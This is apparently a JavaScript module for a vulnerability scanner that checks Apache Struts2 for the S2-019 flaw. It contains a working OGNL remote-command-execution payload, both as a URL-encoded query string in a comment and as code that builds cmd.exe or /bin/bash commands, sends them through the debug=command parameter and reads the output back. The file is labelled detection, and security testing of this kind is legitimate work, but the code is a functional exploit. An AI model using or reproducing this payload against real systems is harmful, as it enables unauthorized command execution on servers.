module.exports={
	tags:"struts2,019",
	des:"struts2 019Vulnerability detection",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/struts2/s2-019",
		"http://ocnf2x3pk.bkt.clouddn.com/S2-019.war"],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-019"],
/*
?debug=command&expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27id%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A
*/
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var fnT = function(bW)
		{
			// (@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))
			var s = ('#iswin=' + !!bW + ',#cmds=(#iswin?{\'cmd.exe\',\'/c\',\'' + _s.g_szCmdW + '\'}:{\'/bin/bash\',\'-c\',\'' + _s.g_szCmd + '\'}),#a=(new java.lang.ProcessBuilder(#cmds)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")'
				+',#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#e=new char[50000],#i=#d.read(#e),#wt=#f.getWriter(),#wt.println(new java.lang.String(#e,0,#i)),#wt.flush()'
				+',#wt.close()');
			_s.request(_s.fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" 
				+ encodeURIComponent(s)
				})
			  , function (error, response, body){
			  		_s.error(error);
			  	// console.log(error||body);
			  		if(body)
			  		{
			  			_s.fnShowBody(body);
			  			_s.fnDoBody(body.replace(/\u0000|\r/gmi,''),"s2-019",url,null,function(o)
				    	{
				    		var r = {"url":url,"send":s};
			  				fnCbk(_s.copyO2O(r,o),_t);
				    	});
			  		}
			    }
			  );
			};
			fnT(false);
			fnT(true);
	}
};